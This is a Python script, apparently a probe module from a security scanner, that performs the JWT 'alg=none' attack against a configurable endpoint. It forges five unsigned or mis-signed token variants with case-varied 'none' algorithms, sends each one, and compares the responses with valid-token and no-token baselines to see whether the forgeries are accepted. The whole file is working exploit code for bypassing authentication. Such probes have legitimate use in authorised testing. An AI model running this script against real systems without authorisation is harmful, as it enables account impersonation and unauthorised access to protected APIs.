#!/usr/bin/env python3
"""JWT alg=none attack — strip signature, set algorithm to none, test acceptance.

Output: measurements only; no status or confidence.
Exit codes: 0 = probes completed, 2 = config error.
"""

import hashlib
import json
import sys
import time
import urllib.request
import urllib.error
import base64

# Configuration — replace before running
TARGET_URL = "http://localhost:3000/api/me"
TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature"
AUTH_HEADER = "Bearer"  # Prefix for Authorization header


def b64url_decode(s):
    """Base64url decode with padding."""
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_encode(data):
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def forge_token(token):
    """Create alg=none variants of the token."""
    parts = token.split(".")
    if len(parts) != 3:
        return None, "invalid JWT structure (expected 3 parts)"

    try:
        header = json.loads(b64url_decode(parts[0]))
    except Exception as e:
        return None, f"failed to decode header: {e}"

    original_alg = header.get("alg", "unknown")

    variants = []

    # Variant 1: alg=none, empty signature
    h1 = dict(header)
    h1["alg"] = "none"
    forged1 = b64url_encode(json.dumps(h1).encode()) + "." + parts[1] + "."
    variants.append(("alg_none_empty_sig", forged1))

    # Variant 2: alg=None (capitalized)
    h2 = dict(header)
    h2["alg"] = "None"
    forged2 = b64url_encode(json.dumps(h2).encode()) + "." + parts[1] + "."
    variants.append(("alg_None_cap", forged2))

    # Variant 3: alg=NONE (all caps)
    h3 = dict(header)
    h3["alg"] = "NONE"
    forged3 = b64url_encode(json.dumps(h3).encode()) + "." + parts[1] + "."
    variants.append(("alg_NONE_caps", forged3))

    # Variant 4: alg=nOnE (mixed case)
    h4 = dict(header)
    h4["alg"] = "nOnE"
    forged4 = b64url_encode(json.dumps(h4).encode()) + "." + parts[1] + "."
    variants.append(("alg_nOnE_mixed", forged4))

    # Variant 5: alg=none, keep original signature
    h5 = dict(header)
    h5["alg"] = "none"
    forged5 = b64url_encode(json.dumps(h5).encode()) + "." + parts[1] + "." + parts[2]
    variants.append(("alg_none_keep_sig", forged5))

    return {"original_alg": original_alg, "variants": variants}, None


def make_request(url, token_value, prefix):
    """Send GET request with token in Authorization header."""
    auth_value = f"{prefix} {token_value}" if prefix else token_value
    req = urllib.request.Request(url)
    req.add_header("Authorization", auth_value)

    start = time.monotonic()
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        body = resp.read().decode("utf-8", errors="replace")
        elapsed = int((time.monotonic() - start) * 1000)
        return {
            "status_code": resp.status,
            "elapsed_ms": elapsed,
            "body_hash": hashlib.sha256(body.encode()).hexdigest(),
            "body_length": len(body),
        }
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        elapsed = int((time.monotonic() - start) * 1000)
        return {
            "status_code": e.code,
            "elapsed_ms": elapsed,
            "body_hash": hashlib.sha256(body.encode()).hexdigest(),
            "body_length": len(body),
        }
    except Exception as e:
        elapsed = int((time.monotonic() - start) * 1000)
        return {
            "status_code": 0,
            "elapsed_ms": elapsed,
            "body_hash": "",
            "body_length": 0,
            "error": str(e),
        }


def main():
    started_at = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

    forge_result, err = forge_token(TOKEN)
    if err:
        print(f"[ERROR] {err}", file=sys.stderr)
        sys.exit(2)

    probe_count = 0

    # Step 1: Original token baseline
    probe_count += 1
    original_round = make_request(TARGET_URL, TOKEN, AUTH_HEADER)
    print(f"[ORIGINAL] status={original_round['status_code']}, len={original_round['body_length']}, time={original_round['elapsed_ms']}ms", file=sys.stderr)

    # Step 2: No token baseline
    probe_count += 1
    no_token_req = urllib.request.Request(TARGET_URL)
    start = time.monotonic()
    try:
        resp = urllib.request.urlopen(no_token_req, timeout=10)
        body = resp.read().decode("utf-8", errors="replace")
        elapsed = int((time.monotonic() - start) * 1000)
        no_token_round = {
            "status_code": resp.status,
            "elapsed_ms": elapsed,
            "body_hash": hashlib.sha256(body.encode()).hexdigest(),
            "body_length": len(body),
        }
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        elapsed = int((time.monotonic() - start) * 1000)
        no_token_round = {
            "status_code": e.code,
            "elapsed_ms": elapsed,
            "body_hash": hashlib.sha256(body.encode()).hexdigest(),
            "body_length": len(body),
        }
    except Exception as e:
        elapsed = int((time.monotonic() - start) * 1000)
        no_token_round = {
            "status_code": 0,
            "elapsed_ms": elapsed,
            "body_hash": "",
            "body_length": 0,
            "error": str(e),
        }
    print(f"[NO_TOKEN] status={no_token_round['status_code']}, len={no_token_round['body_length']}", file=sys.stderr)

    # Step 3: Forged token variants
    variant_results = []
    for name, forged_token in forge_result["variants"]:
        probe_count += 1
        forged_round = make_request(TARGET_URL, forged_token, AUTH_HEADER)
        print(f"[FORGED:{name}] status={forged_round['status_code']}, len={forged_round['body_length']}, time={forged_round['elapsed_ms']}ms", file=sys.stderr)
        time.sleep(0.3)

        variant_results.append({
            "name": name,
            "round": forged_round,
            "status_matches_original": forged_round["status_code"] == original_round["status_code"],
            "hash_matches_original": forged_round["body_hash"] == original_round["body_hash"],
            "status_matches_no_token": forged_round["status_code"] == no_token_round["status_code"],
        })

    result = {
        "vuln_type": "jwt",
        "technique": "alg_none",
        "started_at": started_at,
        "probe_count": probe_count,
        "measurements": {
            "original_alg": forge_result["original_alg"],
            "original_token": original_round,
            "no_token": no_token_round,
            "forged_variants": variant_results,
            "variants_tested": len(forge_result["variants"]),
        },
    }

    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
